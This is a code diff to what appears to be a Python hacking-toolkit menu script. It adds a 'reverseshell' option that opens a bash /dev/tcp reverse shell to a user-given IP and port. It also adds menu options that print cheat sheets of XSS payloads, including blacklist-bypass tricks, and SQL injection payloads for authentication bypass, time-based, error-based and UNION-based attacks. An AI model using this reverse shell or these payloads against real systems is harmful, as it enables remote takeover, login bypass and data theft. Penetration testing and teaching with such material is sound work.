@@ -45,6 +45,9 @@ dmarc - Is a standard email authentication method. ... These reports contain inf
 dirb - Brute force with multiple mass names and handles their return code identifying whether they are returned or not
 listeningport - listening port to backdoor
 dedsecurity - Ded Security Website
+xss - Xss codes
+reverseshell - Bash reverse shell
+sqlinjection - Sql injection codes
 """)
 
 def subdomain():
@@ -148,7 +151,121 @@ while True:
         os.system("sudo nc -l "+ip+" -p "+port+" -v")
     elif i == "dedsecurity":
         webbrowser.open_new_tab('https://www.dedsecurity.com')
-    
+    elif i == "reverseshell":
+        ip = input("Ip: ")
+        port = input("Port: ")
+        os.system("bash -c 'exec bash -i &>/dev/tcp/"+ip+"/"+port+" <&1'")
+    elif i == "xss":
+        print("""
+        XSS in HTML/Applications
+        
+        Basic Payload
 
+        <script>alert('XSS')</script>
+        <s
+        cr<script>ipt>alert('XSS')</scr<script>ipt>
+        "><script>alert("XSS")</script>
+        "><script>alert(String.fromCharCode(88,83,83))</script>
+        
+        Img tag payload
+        
+        <img src=x onerror=alert('XSS');>
+        <img src=x onerror=alert('XSS')//
+        <img src=x onerror=alert(String.fromCharCode(88,83,83));>
+        <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+        <img src=x:alert(alt) onerror=eval(src) alt=xss>
+        "><img src=x onerror=alert("XSS");>
+        "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+        XSS in SVG (short)
+
+        <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
+        <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+        <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+        <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+
+        Bypass word blacklist with code evaluation
+
+        eval('ale'+'rt(0)');
+        Function('ale'+'rt(1)')();
+        new Function`alert`6``;
+        setTimeout('ale'+'rt(2)');
+        setInterval('ale'+'rt(10)');
+        Set.constructor('ale'+'rt(13)')();
+        Set.constructor`alert(14)```;
+        """)
+    elif i == "sqlinjection":
+        print("""
+        Generic SQL Injection Payloads
+
+        ' or '
+        -- or # 
+        ' OR '1
+        ' OR 1 -- -
+        OR "" = "
+        " OR 1 = 1 -- -"
+        ' OR '' = '
+        '='
+        'LIKE'
+        '=0--+
+        OR 1=1
+        ' OR 'x'='x
+        ' AND id IS NULL; --
+        '''''''''''''UNION SELECT '2
+
+        Time-Based
+
+        ,(select * from (select(sleep(10)))a)
+        %2c(select%20*%20from%20(select(sleep(10)))a)
+        ';WAITFOR DELAY '0:0:30'--
+        Generic Error Based Payloads
+        OR 1=1
+        OR 1=1#
+        OR x=y#
+        OR 1=1-- 
+        OR x=x-- 
+        OR 3409=3409 AND ('pytW' LIKE 'pytW
+        HAVING 1=1
+        HAVING 1=1#
+        HAVING 1=0-- 
+        AND 1=1-- 
+        AND 1=1 AND '%'='
+        WHERE 1=1 AND 1=0--
+        %' AND 8310=8310 AND '%'='
+
+        Authentication Based Payloads
+
+        ' or ''-'
+        ' or '' '
+        ' or ''&'
+        ' or ''^'
+        ' or ''*'
+        or true--
+        " or true--
+        ' or true--
+        ") or true--
+        ') or true--
+        admin') or ('1'='1'--
+        admin') or ('1'='1'#
+        admin') or ('1'='1'/
+
+        Order by and UNION Based Payloads
+
+        1' ORDER BY 1--+
+        1' ORDER BY 2--+
+        1' ORDER BY 3--+
+        1' ORDER BY 1,2--+
+        1' ORDER BY 1,2,3--+
+        1' GROUP BY 1,2,--+
+        1' GROUP BY 1,2,3--+
+        ' GROUP BY columnnames having 1=1 --
+        -1' UNION SELECT 1,2,3--+
+        ' UNION SELECT sum(columnname ) from tablename --
+        -1 UNION SELECT 1 INTO @,@
+        -1 UNION SELECT 1 INTO @,@,@
+        1 AND (SELECT * FROM Users) = 1 
+        ' AND MID(VERSION(),1,1) = '5';
+        ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+        """)    
 
 
